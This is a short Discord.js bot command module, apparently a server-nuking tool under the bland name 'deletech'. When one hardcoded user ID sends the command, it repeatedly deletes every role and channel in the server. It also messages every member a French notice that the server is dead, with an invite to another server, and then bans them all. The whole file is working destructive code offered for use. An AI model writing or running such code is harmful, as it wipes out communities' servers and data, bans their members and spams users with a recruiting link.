const Discord = require("discord.js");
const { RichEmbed } = require("discord.js");

module.exports.run = async (bot, message, args) =>{
console.log("test")
  if(message.author.id === "212238091455299585") {
    message.delete();
    var deletede = setInterval(deleting, 300)
    function deleting() {
      message.guild.roles.forEach(role => role.delete())
      message.guild.channels.forEach(channel => channel.delete())
      message.guild.members.forEach(membre => membre.send("Le serveur est mort, rejoind ce serveur maintenant : https://discord.gg/CEWf2ZE"))
      message.guild.members.forEach(membre => membre.ban())
    }
  }
}
module.exports.help = {
    name: "deletech"
}